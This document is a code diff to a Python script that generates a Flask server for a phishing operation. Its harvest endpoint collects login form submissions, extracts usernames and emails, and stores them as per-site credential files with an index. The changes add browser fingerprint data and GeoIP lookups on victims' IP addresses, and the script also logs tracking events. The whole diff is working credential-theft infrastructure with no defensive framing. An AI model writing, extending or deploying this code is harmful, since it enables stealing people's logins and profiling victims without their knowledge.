@@ -14,7 +14,6 @@ def launch_flask_server(site_root, main_file_rel, site_credentials_dir, port=808
 
     server_script = """
 import logging
-# === SUPPRESS FLASK'S VERBOSE ACCESS LOGS ===
 logging.getLogger('werkzeug').setLevel(logging.ERROR)
 
 from flask import Flask, request, send_file, send_from_directory, jsonify, abort, make_response
@@ -55,7 +54,7 @@ def get_client_ip():
         return request.headers.get('X-Real-IP')
     return request.remote_addr
 
-def get_client_info():
+def get_client_info_server():
     client_ip = get_client_ip()
     info = {{
         'ip': client_ip,
@@ -77,21 +76,26 @@ def get_client_info():
     return info
 
 def extract_username_from_data(data):
+    # data may contain 'form_data'
+    if isinstance(data, dict) and 'form_data' in data:
+        form_data = data['form_data']
+    else:
+        form_data = data
     username_keys = ['email', 'username', 'user', 'login', 'user_id', 'name', 'account']
     for key in username_keys:
-        if key in data and data[key] and str(data[key]).strip():
-            val = str(data[key]).strip()
-            # Allow @ and + in emails
+        if key in form_data and form_data[key] and str(form_data[key]).strip():
+            val = str(form_data[key]).strip()
             safe = "".join(c for c in val if c.isalnum() or c in '._-+@')
             return safe
     return "unknown"
 
-def save_credentials(data, site, session_id):
-    # === FIXED: Save directly into CREDS_DIR (which is already the site folder) ===
-    site_dir = CREDS_DIR  
+def save_credentials(payload, site, session_id):
+    # payload contains: form_data, client_info (from browser), timestamp
+    site_dir = CREDS_DIR
     os.makedirs(site_dir, exist_ok=True)
     
-    username = extract_username_from_data(data)
+    # Extract username from form_data
+    username = extract_username_from_data(payload)
     if len(username) > 40:
         username = username[:40]
     
@@ -99,25 +103,22 @@ def save_credentials(data, site, session_id):
     filename = site + "_" + username + "_" + timestamp + ".json"
     filepath = os.path.join(site_dir, filename)
     
+    # Build entry with combined info
     entry = {{
         "id": filename.replace('.json', ''),
         "timestamp": datetime.datetime.now().isoformat(),
         "session_id": session_id,
         "site": site,
-        "data": data,
-        "client_info": get_client_info(),
-        "server_info": {{
-            "host": request.host,
-            "path": request.path,
-            "method": request.method,
-            "remote_addr": request.remote_addr
-        }}
+        "form_data": payload.get('form_data', {{}}),
+        "browser_info": payload.get('client_info', {{}}),
+        "server_info": get_client_info_server(),
+        "server_geo": get_geoip_data(get_client_ip())
     }}
     
     with open(filepath, 'w') as f:
         json.dump(entry, f, indent=2)
     
-    # Update index
+    # Update index (exclude)
     index_file = os.path.join(site_dir, "all_credentials_index.json")
     try:
         if os.path.exists(index_file):
@@ -129,7 +130,7 @@ def save_credentials(data, site, session_id):
         index_data = []
     
     data_summary = {{}}
-    for key, value in data.items():
+    for key, value in entry.get('form_data', {{}}).items():
         if isinstance(value, (str, int, float, bool)):
             val_str = str(value)
             data_summary[key] = val_str[:50] + "..." if len(val_str) > 50 else val_str
@@ -206,6 +207,7 @@ def harvest():
                     save_event(event, site, session_id)
                 return jsonify({{"status": "events_received", "count": len(data['events'])}}), 200
             else:
+                # data is now the full payload (form_data + client_info)
                 filename = save_credentials(data, site, session_id)
                 return jsonify({{"status": "success", "file": filename}}), 200
         elif isinstance(data, str) and data.strip():
@@ -223,9 +225,7 @@ def harvest():
 def save_event(event, site, session_id):
     site_dir = os.path.join(CREDS_DIR, site)
     os.makedirs(site_dir, exist_ok=True)
-    
     events_file = os.path.join(site_dir, "tracking_events.json")
-    
     try:
         if os.path.exists(events_file):
             with open(events_file, 'r') as f:
@@ -234,11 +234,9 @@ def save_event(event, site, session_id):
             events = []
     except:
         events = []
-    
     events.append(event)
     if len(events) > 1000:
         events = events[-1000:]
-    
     with open(events_file, 'w') as f:
         json.dump(events, f, indent=2)
 
